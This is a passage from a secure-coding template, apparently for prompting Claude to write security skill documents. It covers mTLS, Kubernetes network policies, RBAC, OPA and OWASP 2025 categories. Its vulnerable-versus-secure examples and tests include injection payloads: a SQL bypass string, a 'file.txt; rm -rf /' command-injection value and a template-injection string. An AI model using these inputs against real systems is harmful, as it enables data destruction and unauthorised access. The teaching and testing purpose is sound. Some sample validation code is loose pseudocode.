**Template Instructions**:
- **MANDATORY FOR**: HIGH-risk domains (API gateways, microservices, financial systems, healthcare)
- **RECOMMENDED FOR**: MEDIUM-risk domains with service-to-service communication
- **SKIP IF**: Monolithic applications without internal service boundaries, local-only tools

**Content to Include**:

#### 4.5.1 Mutual TLS (mTLS) for Service Communication

**Principle**: Never trust internal network. All service-to-service communication MUST be authenticated and encrypted.

```markdown
### mTLS Configuration

**Service Mesh Implementation** ([Istio/Linkerd/Consul Connect]):
```[config_format]
# Enable mTLS for all services in namespace
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: [namespace]
spec:
  mtls:
    mode: STRICT  # Reject non-mTLS connections
```

**Certificate Management**:
```[language]
# ✅ Automated certificate rotation (cert-manager)
apiVersion: cert-manager.io/v1
kind: Certificate
metadata:
  name: [service]-mtls
spec:
  secretName: [service]-mtls-certs
  duration: 720h  # 30 days
  renewBefore: 168h  # Renew 7 days before expiry
  issuerRef:
    name: internal-ca
    kind: ClusterIssuer
  commonName: [service].[namespace].svc.cluster.local
  dnsNames:
    - [service].[namespace].svc.cluster.local
```

**Service Identity Verification**:
```[language]
# ✅ Verify caller identity from certificate
def handle_request(request):
    # Extract client certificate CN
    client_cert = request.ssl_cert
    client_identity = client_cert.subject.common_name

    # Verify expected caller
    if client_identity not in ALLOWED_SERVICES:
        raise Forbidden(f"Service {client_identity} not authorized")

    # Log for audit
    logger.info(f"Request from service: {client_identity}")
    return process_request(request)
```
```

#### 4.5.2 Network Segmentation & Zero Trust Network Policies

**Default Deny Approach**:
```markdown
### Network Policies (MANDATORY for production)

**Step 1: Deny All Traffic (Default)**:
```yaml
# Default deny all ingress and egress
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
  namespace: [namespace]
spec:
  podSelector: {}  # Applies to all pods
  policyTypes:
  - Ingress
  - Egress
```

**Step 2: Allow Only Required Traffic**:
```yaml
# Allow specific service-to-service communication
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: [service]-allow
spec:
  podSelector:
    matchLabels:
      app: [service]
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: [api-gateway]  # Only API gateway can call this service
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: [database]  # This service can only call database
    ports:
    - protocol: TCP
      port: 5432
  - to:  # Allow DNS
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: UDP
      port: 53
```

**Cloud Provider Network ACLs**:
```[config_format]
# AWS Security Group - deny all by default
resource "aws_security_group" "[service]" {
  name = "[service]-sg"

  # No default ingress rules = deny all

  # Explicit egress to database only
  egress {
    from_port   = 5432
    to_port     = 5432
    protocol    = "tcp"
    security_groups = [aws_security_group.database.id]
  }

  # Egress to internet for external APIs (restrict by IP if possible)
  egress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # Consider restricting to specific IPs
  }
}
```
```

#### 4.5.3 Least Privilege Access Control (RBAC)

**Kubernetes RBAC** (if applicable):
```markdown
### Service Account Permissions (MANDATORY)

**Principle**: Each service gets minimum permissions needed.

```yaml
# ✅ Minimal service account permissions
apiVersion: v1
kind: ServiceAccount
metadata:
  name: [service]-sa
  namespace: [namespace]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: [service]-role
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get", "list"]  # Read-only access to config
  resourceNames: ["[service]-config"]  # Only this specific ConfigMap
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get"]
  resourceNames: ["[service]-secret"]  # Only this specific Secret
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: [service]-binding
subjects:
- kind: ServiceAccount
  name: [service]-sa
roleRef:
  kind: Role
  name: [service]-role
  apiGroup: rbac.authorization.k8s.io
```

**❌ NEVER do this**:
```yaml
# ❌ BAD: Overly permissive
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]  # Can do ANYTHING - security disaster!
```
```

#### 4.5.4 API Gateway Authentication & Authorization

**Gateway-Level Security**:
```markdown
### API Gateway Pattern

**Authentication at Gateway**:
```[language]
# ✅ Authenticate at API gateway, pass identity downstream
class APIGateway:
    def handle_request(self, request):
        # 1. Authenticate user
        token = request.headers.get('Authorization')
        user = self.verify_jwt(token)

        if not user:
            return Response(status=401, body="Unauthorized")

        # 2. Add verified user identity to internal request
        internal_headers = {
            'X-User-ID': user.id,
            'X-User-Roles': ','.join(user.roles),
            'X-Request-ID': generate_request_id(),
        }

        # 3. Call backend service with mTLS + user context
        response = self.call_backend_service(
            url=backend_url,
            headers=internal_headers,
            verify_mtls=True
        )

        return response

# Backend service trusts gateway (verified via mTLS)
class BackendService:
    def handle_request(self, request):
        # Extract user identity from trusted gateway
        user_id = request.headers.get('X-User-ID')
        user_roles = request.headers.get('X-User-Roles').split(',')

        # Authorize based on user context
        if 'admin' not in user_roles:
            raise Forbidden("Admin access required")

        return self.process_admin_request(user_id)
```

**Per-Endpoint Authorization**:
```[language]
# ✅ Fine-grained authorization
@app.route('/api/v1/[resources]/{id}', methods=['GET'])
@require_auth  # User must be authenticated
@require_role('user')  # User must have 'user' role
def get_[resource](id):
    # Additional check: User can only access their own data
    if request.user.id != id and 'admin' not in request.user.roles:
        raise Forbidden("Cannot access other users' data")

    return db.query_[resource](id)
```
```

#### 4.5.5 Service-to-Service Authorization Policies

**OPA (Open Policy Agent) for Authorization**:
```markdown
### Centralized Authorization Policies

**Policy Definition** (Rego language):
```rego
# policies/[service]-authz.rego
package [service].authz

# Allow if caller is API gateway AND user has required role
allow {
    input.caller_service == "api-gateway"
    input.user_roles[_] == "admin"
    input.method == "DELETE"
}

# Allow read operations for all authenticated users
allow {
    input.caller_service == "api-gateway"
    input.method == "GET"
}

# Deny everything else by default
default allow = false
```

**Enforcement**:
```[language]
# ✅ Check authorization policy before processing
def handle_request(request):
    # Build policy input
    policy_input = {
        "caller_service": request.mtls_identity,
        "user_roles": request.headers.get('X-User-Roles').split(','),
        "method": request.method,
        "path": request.path,
        "resource_id": request.path_params.get('id')
    }

    # Query OPA for decision
    decision = opa_client.query("data.[service].authz.allow", policy_input)

    if not decision.get('result'):
        logger.warning(f"Authorization denied: {policy_input}")
        raise Forbidden("Access denied by policy")

    return process_request(request)
```
```

#### 4.5.6 Secrets Distribution (Zero Trust)

**Principle**: Secrets never in code, configs, or environment variables accessible to users.

```markdown
### Secrets Management in Zero Trust Environment

**Secrets Injection at Runtime**:
```[config_format]
# Kubernetes: Use external secrets operator
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: [service]-secrets
spec:
  refreshInterval: 1h  # Refresh secrets every hour
  secretStoreRef:
    name: aws-secrets-manager
    kind: SecretStore
  target:
    name: [service]-secrets
    creationPolicy: Owner
  data:
  - secretKey: database_password
    remoteRef:
      key: /[service]/production/db_password
  - secretKey: api_key
    remoteRef:
      key: /[service]/production/api_key
```

**Application Access**:
```[language]
# ✅ Secrets mounted as files (not env vars)
def get_database_password():
    # Read from mounted secret file
    with open('/secrets/database_password', 'r') as f:
        return f.read().strip()

# Secrets are never in environment variables or logs
db_password = get_database_password()
connection = connect_database(password=db_password)
```

**Workload Identity** (Cloud Provider):
```[config_format]
# AWS: Use IRSA (IAM Roles for Service Accounts)
# Service account assumes IAM role to access secrets
apiVersion: v1
kind: ServiceAccount
metadata:
  name: [service]-sa
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::[account]:role/[service]-secrets-role

# Application code - no credentials needed!
[language]:
  # AWS SDK automatically uses IRSA credentials
  secrets_client = boto3.client('secretsmanager')
  secret = secrets_client.get_secret_value(SecretId='/[service]/production/db_password')
```
```

#### 4.5.7 Zero Trust Verification & Monitoring

**Continuous Verification**:
```markdown
### Trust But Verify - Monitor All Service Communication

**Service Mesh Observability**:
```[language]
# ✅ Log all service-to-service calls
metrics.counter('[service]_calls_total',
                tags={
                    'caller': caller_identity,
                    'endpoint': endpoint,
                    'status': response.status_code
                })

# Alert on anomalies
if caller_identity not in EXPECTED_CALLERS:
    alert_security_team(f"Unexpected caller: {caller_identity} → {endpoint}")
```

**Audit Zero Trust Policies**:
```[language]
# ✅ Regular audit of network policies
def audit_network_policies():
    # Find pods without network policies
    pods = k8s.list_pods(namespace='production')
    for pod in pods:
        policies = k8s.find_network_policies(pod)
        if not policies:
            alert(f"Pod {pod.name} has no network policy - security risk!")

    # Find overly permissive policies
    for policy in k8s.list_network_policies():
        if policy.allows_all_egress:
            alert(f"Policy {policy.name} allows all egress - review needed")
```
```

---

## 5. Security, Quality & Performance Standards

**Template Instructions**: This section is CRITICAL for all domains. Apply security depth based on domain risk level (see Section 0.1).

**MANDATORY Subsections**:
- **5.1**: Domain-Specific Vulnerability Landscape (2022-2025) - Research recent CVEs
- **5.2**: OWASP/CWE Compliance Matrix - Map to security frameworks
- **5.3**: Input Validation Framework - Multi-layer validation
- **5.4**: Secrets Management - Environment variables, KMS, rotation
- **5.5**: Error Handling & Information Disclosure - Safe error messages
- **5.6**: Performance & Scalability - Benchmarks, optimization
- **5.7**: Code Quality Standards - Linting, formatting, complexity

**CONDITIONAL Subsections** (High-risk domains):
- **5.8**: Cryptography Standards - Algorithms, key management
- **5.9**: Authentication & Authorization Patterns - AuthN/AuthZ implementation
- **5.10**: Security Headers & Web Application Security - CSP, HSTS, CSRF, XSS

---

### 5.1 Domain-Specific Vulnerability Landscape (2022-2025)

**Template Instructions**:
- **HIGH-RISK**: Document top 10 domain-specific vulnerabilities from past 2-3 years
- **MEDIUM-RISK**: Document top 5 domain-specific vulnerabilities
- **LOW-RISK**: Document top 2-3 common issues

**INSTRUCTIONS FOR CLAUDE**:
1. Use WebSearch to find recent CVEs and security advisories for this technology/domain
2. Search: "[technology] CVE 2024", "[framework] security vulnerabilities 2023", "[domain] common weaknesses CWE"
3. Document each vulnerability with CVE ID, CWE category, severity, mitigation

**Example Structure**:
```markdown
### 5.1 Domain-Specific Vulnerability Landscape (2022-2025)

**Research Date**: [YYYY-MM-DD]
**Research Sources**: [List CVE databases, advisories, security blogs consulted]

**Critical Vulnerabilities Identified**:

#### 1. [Vulnerability Name] (CVE-YYYY-XXXXX, CWE-XXX: [CWE Category])

**Severity**: 🔴 Critical / 🟠 High / 🟡 Medium / 🟢 Low

**Description**:
[Brief description of the vulnerability - what is it, why it matters]

**Affected Versions**:
- [Technology/Framework]: [Versions affected]
- [Dependency]: [Versions affected]

**Attack Scenario**:
[Concrete example of how an attacker would exploit this]

**Real-World Impact**:
[If available, mention real-world incidents or CVE reports]

**Mitigation**:
```[language]
# ❌ VULNERABLE CODE
[Example of vulnerable code that demonstrates the issue]

# ✅ SECURE CODE
[Example of secure code that prevents the vulnerability]
```

**Additional Controls**:
- [Control 1]: [Description]
- [Control 2]: [Description]

**Detection**:
```[language/bash]
# How to detect this vulnerability in your codebase
[SAST rule, grep pattern, or detection method]
```

**References**:
- CVE: [Link to CVE details]
- Advisory: [Link to security advisory]
- Patch: [Link to patch/fix]

---

[Repeat for each vulnerability - 10 for High-risk, 5 for Medium-risk, 2-3 for Low-risk]
```

---

### 5.2 OWASP Top 10 & CWE Compliance Matrix

**🚨 VALIDATION GATE: OWASP Coverage Completeness 🚨**

**BLOCKING for HIGH-RISK domains**

---

### OWASP Coverage Validation Protocol

For HIGH-RISK domains, Claude MUST ensure complete coverage of all 10 OWASP 2025 categories.

**MANDATORY Validation (HIGH-RISK):**

```python
owasp_2025_categories = [
    "A01:2025 - Broken Access Control",
    "A02:2025 - Security Misconfiguration",
    "A03:2025 - Software Supply Chain Failures",
    "A04:2025 - Cryptographic Failures",
    "A05:2025 - Injection",
    "A06:2025 - Insecure Design",
    "A07:2025 - Authentication Failures",
    "A08:2025 - Software/Data Integrity Failures",
    "A09:2025 - Logging & Alerting Failures",
    "A10:2025 - Mishandling of Exceptional Conditions"
]

def validate_owasp_coverage(skill_content, risk_level):
    """
    Validate OWASP coverage completeness.
    BLOCKING for HIGH-RISK domains.
    """

    if risk_level != "HIGH":
        return ValidationSuccess("OWASP validation not required")

    coverage = {}
    for category in owasp_2025_categories:
        coverage[category] = validate_category_complete(category, skill_content)

    # Each category MUST have:
    required_elements = {
        "risk_assessment": check_risk_level_documented(category),
        "domain_rationale": check_why_matters_explained(category),
        "code_examples": check_has_code_examples(category),  # Both ❌ and ✅
        "testing_approach": check_testing_documented(category),
        "cwe_mapping": check_cwe_ids_listed(category)
    }

    # Find incomplete categories:
    incomplete = [cat for cat, complete in coverage.items() if not complete]

    if len(incomplete) > 0:
        return ValidationFailure(
            f"Missing/incomplete OWASP categories: {incomplete}"
        )

    return ValidationSuccess("All 10 OWASP 2025 categories complete")
```

---

### Coverage Requirements by Category

**For each OWASP category (HIGH-RISK only), Claude MUST include:**

**✅ REQUIRED ELEMENTS:**
1. **Risk Level for This Domain**
   - Assessment: Critical / High / Medium / Low / N/A
   - Must explain WHY this level for THIS specific domain

2. **Why This Matters**
   - Domain-specific explanation
   - Example: "Backend APIs must prevent unauthorized resource access"

3. **Common Scenarios**
   - At least 2-3 domain-specific attack scenarios
   - Concrete examples, not generic

4. **Implementation Guidance with Code**
   - ❌ Bad example (vulnerable code)
   - ✅ Good example (secure code)
   - Security comments explaining the fix

5. **Testing Approach**
   - How to test for this vulnerability
   - Code example of security test

6. **CWE Mapping**
   - List relevant CWE IDs
   - Brief explanation of each CWE

---

### Validation Failure Response

**IF OWASP coverage incomplete, Claude MUST output:**

```
❌ OWASP COVERAGE VALIDATION FAILED ❌

Risk Level: HIGH
HIGH-RISK domains require ALL 10 OWASP 2025 categories.

Coverage Status:
✅ A01:2025 - Broken Access Control (COMPLETE)
✅ A02:2025 - Security Misconfiguration (COMPLETE)
❌ A03:2025 - Software Supply Chain Failures (INCOMPLETE - missing code examples)
✅ A04:2025 - Cryptographic Failures (COMPLETE)
✅ A05:2025 - Injection (COMPLETE)
❌ A06:2025 - Insecure Design (MISSING)
✅ A07:2025 - Authentication Failures (COMPLETE)
✅ A08:2025 - Software/Data Integrity Failures (COMPLETE)
✅ A09:2025 - Logging & Alerting Failures (COMPLETE)
❌ A10:2025 - Mishandling of Exceptional Conditions (INCOMPLETE - missing testing approach)

Missing/Incomplete: 3 categories

⛔ Cannot proceed with HIGH-RISK skill without complete OWASP coverage ⛔

Each category needs:
✅ Risk level assessment for THIS domain
✅ Domain-specific rationale (why it matters)
✅ 2-3 attack scenarios
✅ Code examples (❌ bad + ✅ good)
✅ Testing approach with test code
✅ CWE mapping

Action required:
1. Complete missing categories (A06)
2. Add missing elements to incomplete categories (A03, A10)
3. Re-validate after additions

Task paused until OWASP coverage complete.
```

---

### Success Response

**IF OWASP coverage complete, Claude MUST output:**

```
✅ OWASP COVERAGE VALIDATION PASSED ✅

Risk Level: HIGH

Coverage Status:
✅ A01:2025 - Broken Access Control (COMPLETE)
✅ A02:2025 - Security Misconfiguration (COMPLETE)
✅ A03:2025 - Software Supply Chain Failures (COMPLETE)
✅ A04:2025 - Cryptographic Failures (COMPLETE)
✅ A05:2025 - Injection (COMPLETE)
✅ A06:2025 - Insecure Design (COMPLETE)
✅ A07:2025 - Authentication Failures (COMPLETE)
✅ A08:2025 - Software/Data Integrity Failures (COMPLETE)
✅ A09:2025 - Logging & Alerting Failures (COMPLETE)
✅ A10:2025 - Mishandling of Exceptional Conditions (COMPLETE)

All 10 categories: COMPLETE (10/10)

Each category includes:
✅ Risk assessment
✅ Domain rationale
✅ Attack scenarios
✅ Code examples (❌ + ✅)
✅ Testing approach
✅ CWE mappings

Proceeding with skill generation.
```

---

### Post-Generation Validation

**After skill generation, Claude MUST validate:**

```
📋 GATE 5.2 OWASP COVERAGE VALIDATION: COMPLETE

OWASP 2025 Categories: 10/10 ✅
Code Examples Per Category: 2+ (❌ bad, ✅ good) ✅
Testing Approaches: 10/10 categories ✅
CWE Mappings: Complete ✅

Total OWASP code examples: 23
Total security test examples: 12

✅ OWASP coverage meets HIGH-RISK requirements
```

---

### Exception Handling by Risk Level

**MEDIUM-RISK domains:**
- Validation RECOMMENDED but not blocking
- Core 5 categories sufficient:
  - A01 (Access Control)
  - A02 (Misconfiguration)
  - A03 (Supply Chain)
  - A05 (Injection)
  - A07 (Authentication)
- Can have briefer coverage (1 example per category)

**LOW-RISK domains:**
- Validation OPTIONAL
- Cover applicable categories only (typically A01, A03, A05)
- Brief coverage acceptable

---

**Template Instructions**:
- **HIGH-RISK**: Cover ALL 10 OWASP categories + relevant CWE Top 25
- **MEDIUM-RISK**: Cover core categories (A01, A02, A03, A05, A07)
- **LOW-RISK**: Cover applicable categories (typically A01, A03, A05)

**INSTRUCTIONS FOR CLAUDE**:
For each OWASP category:
1. Assess risk level for THIS domain (Critical/High/Medium/Low/N/A)
2. If Medium or higher, provide domain-specific implementation guidance
3. Include ✅ DO and ❌ DON'T code examples
4. Map to relevant CWE categories
5. Specify testing approach

**Example Structure**:
```markdown
### 5.2 OWASP Top 10 2025 & CWE Compliance Matrix

**Compliance Assessment for [Domain Name]**:

| OWASP ID | Category | Risk Level for This Domain | CWE Mappings | Coverage |
|----------|----------|----------------------------|--------------|----------|
| A01:2025 | Broken Access Control | [Critical/High/Medium/Low/N/A] | CWE-200, CWE-269, CWE-284, CWE-639, CWE-918 | [Status] |
| A02:2025 | Security Misconfiguration | [Critical/High/Medium/Low/N/A] | CWE-2, CWE-16, CWE-209, CWE-732 | [Status] |
| A03:2025 | Software Supply Chain Failures | [Critical/High/Medium/Low/N/A] | CWE-1104, CWE-829, CWE-494 | [Status] |
| A04:2025 | Cryptographic Failures | [Critical/High/Medium/Low/N/A] | CWE-259, CWE-327, CWE-916 | [Status] |
| A05:2025 | Injection | [Critical/High/Medium/Low/N/A] | CWE-79, CWE-89, CWE-94, CWE-917 | [Status] |
| A06:2025 | Insecure Design | [Critical/High/Medium/Low/N/A] | CWE-209, CWE-256, CWE-501, CWE-522 | [Status] |
| A07:2025 | Authentication Failures | [Critical/High/Medium/Low/N/A] | CWE-287, CWE-297, CWE-384, CWE-620, CWE-640 | [Status] |
| A08:2025 | Software or Data Integrity Failures | [Critical/High/Medium/Low/N/A] | CWE-502, CWE-829, CWE-494 | [Status] |
| A09:2025 | Logging & Alerting Failures | [Critical/High/Medium/Low/N/A] | CWE-117, CWE-223, CWE-532, CWE-778 | [Status] |
| A10:2025 | Mishandling of Exceptional Conditions | [Critical/High/Medium/Low/N/A] | CWE-209, CWE-252, CWE-755 | [Status] |

---

#### A01:2025 - Broken Access Control

**Risk Level for [Domain]**: [Critical/High/Medium/Low/N/A]

**Note**: A01:2025 now also includes SSRF (Server-Side Request Forgery) which was previously A10:2021.

**Why This Matters in This Domain**:
[Domain-specific explanation - e.g., "Backend APIs must ensure users can only access their own resources"]

**Common Scenarios in [Domain]**:
1. [Scenario 1]: [Description]
2. [Scenario 2]: [Description]
3. [Scenario 3]: [Description]

**CWE Mappings**:
- **CWE-200**: Exposure of Sensitive Information to an Unauthorized Actor
- **CWE-269**: Improper Privilege Management
- **CWE-284**: Improper Access Control
- **CWE-639**: Authorization Bypass Through User-Controlled Key

**Implementation Guidance**:

```[language]
# ❌ BROKEN ACCESS CONTROL
@app.get("/api/users/{user_id}/profile")
async def get_profile(user_id: int):
    # No authorization check - any authenticated user can access any profile!
    return db.query(User).filter(User.id == user_id).first()

# ✅ SECURE ACCESS CONTROL
@app.get("/api/users/{user_id}/profile")
async def get_profile(user_id: int, current_user: User = Depends(get_current_user)):
    # Authorization check - user can only access their own profile
    if current_user.id != user_id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Access denied")

    return db.query(User).filter(User.id == user_id).first()

# ✅ EVEN BETTER: Resource-based authorization
@app.get("/api/documents/{doc_id}")
async def get_document(doc_id: int, current_user: User = Depends(get_current_user)):
    document = db.query(Document).filter(Document.id == doc_id).first()

    if not document:
        raise HTTPException(status_code=404, detail="Document not found")

    # Check if user has permission for this specific resource
    if not has_permission(current_user, document, "read"):
        raise HTTPException(status_code=403, detail="Access denied")

    return document
```

**Testing Approach**:
```[language]
# Test: Users cannot access other users' resources
def test_cannot_access_other_user_profile():
    user_a = create_user(email="a@example.com")
    user_b = create_user(email="b@example.com")

    # User A tries to access User B's profile
    response = client.get(
        f"/api/users/{user_b.id}/profile",
        headers={"Authorization": f"Bearer {user_a.token}"}
    )

    assert response.status_code == 403

# Test: Admins can access all profiles
def test_admin_can_access_all_profiles():
    admin = create_user(email="admin@example.com", role="admin")
    user = create_user(email="user@example.com")

    response = client.get(
        f"/api/users/{user.id}/profile",
        headers={"Authorization": f"Bearer {admin.token}"}
    )

    assert response.status_code == 200
```

**Additional Controls**:
- Implement role-based access control (RBAC) or attribute-based access control (ABAC)
- Use centralized authorization logic (not scattered across endpoints)
- Default-deny access policies
- Log authorization failures for audit trail

---

[Repeat for A02-A10, providing domain-specific guidance for each]

#### A02:2025 - Security Misconfiguration

**Risk Level for [Domain]**: [Critical/High/Medium/Low/N/A]

**Note**: Moved from A05:2021 to A02:2025 due to increased prevalence.

[Provide domain-specific guidance for security misconfiguration]

---

#### A03:2025 - Software Supply Chain Failures (NEW in 2025)

**Risk Level for [Domain]**: [Critical/High/Medium/Low/N/A]

**Note**: NEW category in 2025, replaces A06:2021 (Vulnerable/Outdated Components) with broader supply chain focus.

**Why This Matters in This Domain**:
Supply chain attacks target dependencies, build processes, and deployment pipelines. Critical for all domains using third-party libraries, containers, or CI/CD.

**Common Scenarios in [Domain]**:
1. **Vulnerable Dependencies**: Using outdated libraries with known CVEs
2. **Malicious Packages**: Dependency confusion attacks, typosquatting
3. **Compromised Build Pipeline**: Injected malicious code during build/deployment
4. **Lack of SBOM**: No software bill of materials for tracking components

**CWE Mappings**:
- **CWE-1104**: Use of Unmaintained Third-Party Components
- **CWE-829**: Inclusion of Functionality from Untrusted Control Sphere
- **CWE-494**: Download of Code Without Integrity Check

**Implementation Guidance**:

```[language]
# ❌ NO DEPENDENCY PINNING
# package.json
{
  "dependencies": {
    "express": "^4.0.0"  # ❌ Allows any 4.x version
  }
}

# ✅ PINNED DEPENDENCIES
# package.json
{
  "dependencies": {
    "express": "4.18.2"  # ✅ Exact version pinned
  }
}

# ✅ LOCK FILES COMMITTED
# Commit package-lock.json, yarn.lock, Pipfile.lock, Cargo.lock
# Ensures reproducible builds

# ✅ DEPENDENCY SCANNING IN CI/CD
name: Security Scan
on: [push, pull_request]
jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run npm audit
        run: npm audit --audit-level=high
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

**SBOM Generation**:
```bash
# Generate Software Bill of Materials
syft dir:. -o spdx-json > sbom.spdx.json
cyclonedx-cli sbom dir:. -o sbom.cyclonedx.json

# Verify dependencies with checksums
npm ci --integrity  # Verifies package integrity
```

**Testing Approach**:
```[language]
# Test: Only approved dependencies are used
def test_no_unapproved_dependencies():
    approved_packages = load_approved_list("approved-packages.txt")
    current_packages = get_installed_packages()

    unapproved = current_packages - approved_packages
    assert len(unapproved) == 0, f"Unapproved packages: {unapproved}"

# Test: No HIGH/CRITICAL vulnerabilities
def test_no_critical_vulnerabilities():
    audit_results = run_dependency_audit()
    critical_vulns = [v for v in audit_results if v.severity in ["HIGH", "CRITICAL"]]
    assert len(critical_vulns) == 0, f"Critical vulnerabilities found: {critical_vulns}"
```

**Additional Controls**:
- Use private package registry for internal dependencies
- Implement dependency approval workflow
- Monitor for newly disclosed CVEs (Dependabot, Renovate)
- Verify package signatures and checksums
- Use container image scanning (Trivy, Grype)
- Implement SBOM in release artifacts

---

#### A04:2025 - Cryptographic Failures

**Risk Level for [Domain]**: [Critical/High/Medium/Low/N/A]

**Note**: Previously A02:2021.

[Provide domain-specific cryptography guidance]

---

#### A05:2025 - Injection

**Risk Level for [Domain]**: [Critical/High/Medium/Low/N/A]

**Note**: Moved from A03:2021 to A05:2025, remains a critical vulnerability class.

**Common Injection Types in [Domain]**:
- SQL Injection (CWE-89)
- NoSQL Injection (CWE-943)
- Command Injection (CWE-78)
- LDAP Injection (CWE-90)
- XPath Injection (CWE-643)
- Template Injection (CWE-1336)

**Implementation Guidance**:

```[language]
# ❌ SQL INJECTION VULNERABILITY
def get_user_by_username(username: str):
    # NEVER use string formatting/concatenation for queries!
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query).fetchone()
    # Attacker input: "admin' OR '1'='1" -- bypasses authentication

# ✅ PARAMETERIZED QUERY (SQL)
def get_user_by_username(username: str):
    # Use parameterized queries - database driver handles escaping
    query = "SELECT * FROM users WHERE username = ?"
    return db.execute(query, (username,)).fetchone()

# ✅ ORM QUERY BUILDER (even better)
from sqlalchemy import select

def get_user_by_username(username: str):
    # ORM query builders provide automatic parameterization
    return db.query(User).filter(User.username == username).first()

# ❌ COMMAND INJECTION VULNERABILITY
import subprocess

def compress_file(filename: str):
    # NEVER pass user input directly to shell commands!
    subprocess.run(f"gzip {filename}", shell=True)
    # Attacker input: "file.txt; rm -rf /" -- deletes filesystem

# ✅ SAFE COMMAND EXECUTION
import subprocess
import shlex
from pathlib import Path

def compress_file(filename: str):
    # Validate input
    file_path = Path(filename).resolve()
    if not file_path.exists() or not file_path.is_file():
        raise ValueError("Invalid file path")

    # Use list form (no shell), never shell=True with user input
    subprocess.run(["gzip", str(file_path)], check=True)

# ❌ TEMPLATE INJECTION (Jinja2)
from jinja2 import Template

def render_greeting(name: str):
    # NEVER pass user input to Template()
    template = Template(f"Hello {name}!")
    return template.render()
    # Attacker input: "{{ config.items() }}" -- exposes config

# ✅ SAFE TEMPLATE RENDERING
from jinja2 import Environment, select_autoescape
from markupsafe import escape

def render_greeting(name: str):
    # Use templating with autoescaping
    env = Environment(autoescape=select_autoescape(['html', 'xml']))
    template = env.from_string("Hello {{ name }}!")
    return template.render(name=name)

    # OR simple escaping for HTML
    return f"Hello {escape(name)}!"
```

**Testing Approach**:
```[language]
# Test: SQL injection attempts are prevented
def test_sql_injection_prevented():
    malicious_username = "admin' OR '1'='1"
    result = get_user_by_username(malicious_username)
    assert result is None  # Should return None, not bypass authentication

# Test: Command injection attempts are prevented
def test_command_injection_prevented():
    malicious_filename = "file.txt; rm -rf /"
    with pytest.raises(ValueError):
        compress_file(malicious_filename)
```

---

[Continue with A06-A09]

#### A10:2025 - Mishandling of Exceptional Conditions (NEW in 2025)

**Risk Level for [Domain]**: [Critical/High/Medium/Low/N/A]

**Note**: NEW category in 2025, focuses on improper error handling and exception management.

**Why This Matters in This Domain**:
Improper exception handling can leak sensitive information, cause application crashes, or enable denial of service attacks. Critical for all production systems.

**Common Scenarios in [Domain]**:
1. **Uncaught Exceptions**: Application crashes due to unhandled errors
2. **Information Leakage**: Stack traces exposed to users
3. **Inconsistent State**: Exceptions leave application in invalid state
4. **Resource Leaks**: Exceptions prevent proper cleanup (file handles, connections)

**CWE Mappings**:
- **CWE-209**: Generation of Error Message Containing Sensitive Information
- **CWE-252**: Unchecked Return Value
- **CWE-755**: Improper Handling of Exceptional Conditions

**Implementation Guidance**:

```[language]
# ❌ UNHANDLED EXCEPTIONS
def process_payment(amount: Decimal):
    # If this raises, application crashes!
    return payment_gateway.charge(amount)

# ❌ EXPOSING EXCEPTION DETAILS
@app.exception_handler(Exception)
async def handle_exception(request, exc):
    # Exposes internal details to users
    return JSONResponse({"error": str(exc), "trace": traceback.format_exc()})

# ✅ COMPREHENSIVE EXCEPTION HANDLING
def process_payment(amount: Decimal) -> Result[Payment, PaymentError]:
    """Process payment with comprehensive error handling."""
    try:
        # Validate preconditions
        if amount <= 0:
            return Err(PaymentError.INVALID_AMOUNT)

        # Attempt payment
        result = payment_gateway.charge(amount)

        # Log success
        logger.info("payment.success", amount=amount, transaction_id=result.id)
        return Ok(result)

    except NetworkError as e:
        # Transient error - can retry
        logger.warning("payment.network_error", error=str(e))
        return Err(PaymentError.NETWORK_ERROR)

    except InsufficientFundsError as e:
        # Business error - user notification
        logger.info("payment.insufficient_funds", user_id=hash_pii(user.id))
        return Err(PaymentError.INSUFFICIENT_FUNDS)

    except Exception as e:
        # Unexpected error - log details internally, safe message externally
        error_id = str(uuid.uuid4())
        logger.exception("payment.unexpected_error", error_id=error_id, exc_info=e)
        return Err(PaymentError.INTERNAL_ERROR, metadata={"error_id": error_id})

# ✅ RESOURCE CLEANUP WITH CONTEXT MANAGERS
def process_file(file_path: str):
    """Ensure resources cleaned up even on exceptions."""
    try:
        with open(file_path, 'r') as f:  # Automatically closed on exception
            data = f.read()
            return process_data(data)
    except FileNotFoundError:
        logger.warning("file.not_found", path=file_path)
        raise BusinessError("File not found")
    except Exception as e:
        logger.exception("file.processing_error", path=file_path, exc_info=e)
        raise InternalError("Failed to process file")
```

**Global Exception Handler**:
```[language]
# ✅ SAFE GLOBAL EXCEPTION HANDLER
@app.exception_handler(Exception)
async def handle_exception(request: Request, exc: Exception):
    error_id = str(uuid.uuid4())

    # Log full details internally
    logger.exception(
        "unhandled_exception",
        error_id=error_id,
        path=request.url.path,
        method=request.method,
        exc_info=exc
    )

    # Return safe message to user
    return JSONResponse(
        status_code=500,
        content={
            "error": "An internal error occurred. Please contact support.",
            "error_id": error_id,
            "timestamp": datetime.utcnow().isoformat()
        }
    )
```

**Testing Approach**:
```[language]
# Test: Exceptions don't leak information
def test_exception_safe_messages():
    response = client.get("/api/trigger-error")
    assert response.status_code == 500

    # Should not contain stack trace or internal details
    assert "Traceback" not in response.text
